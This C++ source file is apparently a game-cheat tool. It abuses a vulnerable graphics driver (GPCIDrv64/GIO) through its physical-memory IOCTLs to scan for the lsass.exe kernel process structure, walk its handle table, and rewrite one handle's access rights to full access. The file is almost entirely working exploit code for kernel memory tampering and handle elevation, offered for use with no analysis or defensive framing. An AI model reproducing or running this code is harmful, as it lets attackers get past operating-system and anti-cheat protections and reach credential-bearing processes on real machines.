// HandleElevationDriver.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include "CheatHelper.h"
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <cstdint>



// Definition of IOCTL numbers
// GPCIDrv64 Driver
#define IOCTL_MAPPHYSICAL	0x9C402580
#define IOCTL_UNMAPPHYSICAL	0x9C402584
// GIO Driver
#define IOCTL_GIO_MAPPHYSICAL	0xC3502004
#define IOCTL_GIO_UNMAPPHYSICAL 0xC3502008
#define IOCTL_GIO_MEMCPY 0xC3502808

// Kernel offsets
#define OFFSET_IMAGEFILENAME 0x450
#define OFFSET_OBJECTTABLE 0x418

#pragma comment(lib, "ntdll.lib")

// Definition of Map and UnMap Phisical Address
typedef ULONG64(*fnMapPhysical)(ULONG64 physicalAddress);
typedef ULONG64(*fnUnMapPhysical)(ULONG64 virtualAddress);


HANDLE hDevice = 0;
DWORD targetPid = NULL;
PipeMessageRequest PMRequest;
PipeMessageResponse PMResponse;

// Remove padding inside structs
#pragma pack(push, 1) 
// Structure of MAP
typedef struct _READ_REQUEST {
	DWORD InterfaceType;
	DWORD Bus;
	ULONG64 PhysicalAddress;
	DWORD IOSpace;
	DWORD size;
} READ_REQUEST;

typedef struct _WRITE_REQUEST {
	DWORDLONG address;
	DWORD length;
	DWORDLONG buffer;
} WRITE_REQUEST;

typedef struct _MEMCPY_REQUEST {
	ULONG64 dest;
	ULONG64 src;
	DWORD size;
} MEMCPY_REQUEST;

struct buffer {
	INT64 pid1;
	INT64 pid2;
} inB, outB;

typedef struct _HANDLE_TABLE_ENTRY
{
	//This struct is incomplete, but we dont really care about the other fields
	ULONGLONG Value;
	ULONGLONG GrantedAccess : 25;
} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY;

//#pragma pack(pop)

typedef struct _HANDLE_TABLE
{
	CHAR fill[100];
} HANDLE_TABLE, *PHANDLE_TABLE;

HANDLE hTarget = NULL;

// Macro to invoke Driver IOCTL
/*#define IOCTLMACRO(iocontrolcode) \
	ULONG64 outbuffer[2] = { 0 };	\
	DWORD returned = 0;	\
	DeviceIoControl(hDevice, ##iocontrolcode##, (LPVOID)&inbuffer, sizeof(inbuffer), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);	\
	return outbuffer[0];	\
*/

// Thanks to Jackson (http://jackson-t.ca/lg-driver-lpe.html)
int memmem(PBYTE haystack,
	DWORD haystack_size,
	PBYTE needle,
	DWORD needle_size)
{
	int haystack_offset = 0;
	int needle_offset = 0;

	haystack_size -= needle_size;

	for (haystack_offset = 0; haystack_offset <= haystack_size; haystack_offset++) {
		for (needle_offset = 0; needle_offset < needle_size; needle_offset++)
			if (haystack[haystack_offset + needle_offset] != needle[needle_offset])
				break; // Next character in haystack.

		if (needle_offset == needle_size)
			return haystack_offset;
	}

	return -1;
}

ULONG64 GIO_mapPhysical(ULONG64 physicaladdress, DWORD size)
{
	READ_REQUEST inbuffer = { 0, 0, physicaladdress, 0, size };
	ULONG64 outbuffer[2] = { 0 };
	DWORD bytes_returned = 0;
	DeviceIoControl(hDevice,
		IOCTL_GIO_MAPPHYSICAL,
		&inbuffer,
		sizeof(inbuffer),
		&outbuffer,
		sizeof(outbuffer),
		&bytes_returned,
		(LPOVERLAPPED)NULL);

	return outbuffer[0];
}

ULONG64 GIO_unmapPhysical(ULONG64 address)
{
	ULONG64 inbuffer = address;
	ULONG64 outbuffer[2] = { 0 };
	DWORD bytes_returned = 0;
	DeviceIoControl(hDevice,
		IOCTL_GIO_UNMAPPHYSICAL,
		(LPVOID)&inbuffer,
		sizeof(inbuffer),
		(LPVOID)outbuffer,
		sizeof(outbuffer),
		&bytes_returned,
		(LPOVERLAPPED)NULL);

	return outbuffer[0];
}

BOOL GIO_memcpy(ULONG64 dest, ULONG64 src, DWORD size)
{
	MEMCPY_REQUEST mystructIn = { dest, src, size };
	BYTE outbuffer[0x30] = { 0 };
	DWORD returned = 0;

	DeviceIoControl(hDevice, IOCTL_GIO_MEMCPY, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);
	if (returned) {
		return TRUE;
	}
	return FALSE;
}



ULONG64 GPCI_mapPhysical(DWORDLONG physicaladdress, DWORD size)
{
	READ_REQUEST inbuffer = { physicaladdress, size };
	ULONG64 outbuffer[2] = {0};
	//PBYTE outbuffer = (PBYTE)malloc(size);
	DWORD bytes_returned = 0;
	DeviceIoControl(hDevice,             
		IOCTL_MAPPHYSICAL,				
		&inbuffer,             
		sizeof(inbuffer),      
		&outbuffer,            
		sizeof(outbuffer),
		&bytes_returned,           
		(LPOVERLAPPED)NULL);

	return outbuffer[0];
}

ULONG64 GPCI_unmapPhysical(ULONG64 address)
{
	ULONG64 inbuffer = address;
	ULONG64 outbuffer[2] = { 0 };
	DWORD bytes_returned = 0;

	DeviceIoControl(hDevice,
		IOCTL_UNMAPPHYSICAL,
		(LPVOID)&inbuffer,
		sizeof(inbuffer),
		(LPVOID)outbuffer,
		sizeof(outbuffer),
		&bytes_returned, 
		(LPOVERLAPPED)NULL);
	
	return outbuffer[0];
}


DWORDLONG findPhisical(DWORDLONG startAddress,
	DWORDLONG stopAddress,
	DWORD searchSpace,
	PBYTE  searchBuffer,
	DWORD bufferSize) 
{
	DWORDLONG matchAddress = 0;

	// Check if space search is bigger than maximum.
	if ((startAddress + searchSpace) > stopAddress)
		return matchAddress;

	//CHECK ULONG64 buffer = GPCI_mapPhysical(startAddress, searchSpace);
	ULONG64 buffer = GIO_mapPhysical(startAddress, searchSpace);

	int offset = memmem((PBYTE)buffer, searchSpace, searchBuffer, bufferSize);
	
	//free
	GPCI_unmapPhysical(buffer);

	if (offset >= 0)
		matchAddress = startAddress + offset;

	return matchAddress;

}

fnMapPhysical pMapPhysical;
fnUnMapPhysical pUnMapPhysical;


int getDeviceHandle() {
	hDevice = CreateFile("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "INVALID_HANDLE_VALUE: " << std::dec << GetLastError() << std::endl;
		return 1;
	}

	pMapPhysical = (fnMapPhysical)GIO_mapPhysical;
	pUnMapPhysical = (fnUnMapPhysical)GIO_unmapPhysical;
	return 0;
}

unsigned __int64 __fastcall ExpLookupHandleTableEntryW7(void *HandleTable, unsigned __int64 handle)
{
	__int64 v2; // r8@2
	signed __int64 v3; // rcx@2
	__int64 v4; // r8@2
	unsigned __int64 result; // rax@3
	unsigned __int64 v6; // [sp+8h] [bp+8h]@1

	v6 = handle;
	v6 = handle & 0xFFFFFFFC;
	if (v6 >= *((DWORD *)HandleTable + 23))
	{
		result = 0i64;
	}
	else
	{
		v2 = *(__int64 *)HandleTable;
		v3 = *(__int64 *)HandleTable & 3i64;
		v4 = v2 - (unsigned int)v3;
		if ((DWORD)v3)
		{
			//JUMPOUT(v3, 1, sub_1403A0DE0);
			result = *(__int64 *)(v4 + ((handle - (handle & 0x3FF)) >> 7)) + 4 * (handle & 0x3FF);
		}
		else
		{
			result = v4 + 4 * handle;
		}
	}
	return result;
}

unsigned __int64 __fastcall ExpLookupHandleTableEntryW10(__int64 a1, __int64 handle)
{
	unsigned __int64 v2; // rdx@1
	__int64 v3; // r8@2
	signed __int64 v4; // rax@2
	ULONGLONG v5; // rax@3
	unsigned __int64 result; // rax@4

	v2 = handle & 0xFFFFFFFFFFFFFFFCui64;
	if (v2 >= *(DWORD *)a1)
	{
		result = 0i64;
	}
	else
	{
		v3 = *(__int64 *)(a1 + 8);
		v4 = *(__int64 *)(a1 + 8) & 3i64;
		if ((DWORD)v4 == 1)
		{
			GIO_memcpy((ULONGLONG)&v5, (v3 + 8 * (v2 >> 10) - 1),sizeof(ULONGLONG));
			return v5 + 4 * (v2 & 0x3FF);
		}
		if ((DWORD)v4)
		{
			ULONGLONG tmp = GIO_mapPhysical((v3 + 8 * (v2 >> 19) - 2), sizeof(ULONGLONG));
			v5 = GIO_mapPhysical( tmp + 8 * ((v2 >> 10) & 0x1FF), sizeof(ULONGLONG));
			return v5 + 4 * (v2 & 0x3FF);
		}
		result = v3 + 4 * v2;
	}
	return result;
}

typedef struct {
	CHAR  ImageFileName[15];
	DWORD PriorityClass;
} _EPROCESS_PATTERN;

_EPROCESS_PATTERN pivotProcess = { "lsass.exe", 0x2 };
PBYTE ppivotProcess = NULL;


ULONG64 findPhisical_ObjectTable(DWORDLONG startAddress,
	DWORDLONG stopAddress,
	DWORD searchSpace,
	PBYTE  searchBuffer,
	DWORD bufferSize)
{
	DWORDLONG matchAddress = NULL;
	DWORDLONG pObjectTableOffset = 0;

	DWORDLONG searchAddress = startAddress;
	
	

	while (TRUE)
	{
		if ((startAddress + searchSpace) >= stopAddress)
		{
			//free(ppivotProcess);
			return matchAddress;
		}

		if (searchAddress % 0x100000 == 0)
		{
			printf("Searching from address: 0x%016I64X.\r", searchAddress);
			fflush(stdout);
		}
		Sleep(0.5);
		matchAddress = findPhisical(searchAddress, _UI64_MAX, searchSpace, searchBuffer, bufferSize);
		
		if (searchAddress % 0x10000000 == 0)
		{
			Sleep(1000);
			fflush(stdout);
		}

		if (searchAddress == 0xffffffff)
		{
			exit(0);
		}

		if (matchAddress > searchAddress)
		{
			// address - (0x450 - 0x418)
			pObjectTableOffset = matchAddress - searchAddress - (OFFSET_IMAGEFILENAME - OFFSET_OBJECTTABLE);

			PBYTE pObjectTableAddr = (PBYTE)malloc(sizeof(DWORDLONG));

			ULONG64 buf = GIO_mapPhysical(searchAddress, searchSpace);
			printf("Searching from address: 0x%016I64X.\r", buf, buf);
			memcpy(pObjectTableAddr, ((void*)(buf + pObjectTableOffset)), sizeof(DWORDLONG));
			GPCI_unmapPhysical(buf);
			//((void**)pObjectTableAddr) deref pointer to pointer

			ULONG64 result = (ULONG64)(pObjectTableAddr);
			return result;
		}
		
		searchAddress += searchSpace;

	}
}


int main()
{
	std::cout << "[+] Init\n";
	CheatHelper::loadConfig();


	// Connecting the vulnerable driver (GPCIDrv64.sys AORUS GRAPHICS ENGINE v1.25)
	getDeviceHandle();
	DWORDLONG startAddress = 0x466a01000;

	DWORDLONG stopAddress = _UI64_MAX;
	DWORD     searchSpace = 0x00001000;
	//PBYTE  bufferTest = { 0xfe };
	
	PBYTE ppivotProcess = (PBYTE)malloc(sizeof(_EPROCESS_PATTERN));
	memcpy(ppivotProcess, &pivotProcess, sizeof(_EPROCESS_PATTERN));


	ULONG64 objectTable = findPhisical_ObjectTable(startAddress, stopAddress, searchSpace, ppivotProcess, sizeof(_EPROCESS_PATTERN));
	Sleep(1000);
	void** pObjectTable = (void**)objectTable;
	
	//uint64_t ptr = pObjectTable;
	//DWORDLONG **pptr = &ptr;

	PBYTE pHandleTable = (PBYTE)malloc(sizeof(_HANDLE_TABLE));
	GIO_memcpy((ULONG64)pHandleTable, (ULONG64)*pObjectTable, sizeof(_HANDLE_TABLE));

	ULONG64 entryAddr = (ULONG64)malloc(sizeof(_HANDLE_TABLE_ENTRY));
	//ULONG64 entry_addr = PHANDLE_TABLE_ENTRY{ nullptr };

	entryAddr = ExpLookupHandleTableEntryW10((ULONGLONG)pHandleTable, (ULONGLONG)0x830);
	//PBYTE entry = (PBYTE)malloc(sizeof(_HANDLE_TABLE_ENTRY));
	//GIO_memcpy((ULONG64)entry, entryAddr, sizeof(_HANDLE_TABLE_ENTRY));

	HANDLE_TABLE_ENTRY entry;
	GIO_memcpy((ULONG64)&entry, entryAddr, sizeof(_HANDLE_TABLE_ENTRY));
	
	Sleep(1000);
	entry.GrantedAccess = 0x1FFFFF;

	GIO_memcpy(entryAddr, (ULONG64)&entry, sizeof(_HANDLE_TABLE_ENTRY));
	//GIO_unmapPhysical(entryAddr);
	
	return 0;
	//auto entry = read<HANDLE_TABLE_ENTRY>(entry_addr);

}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
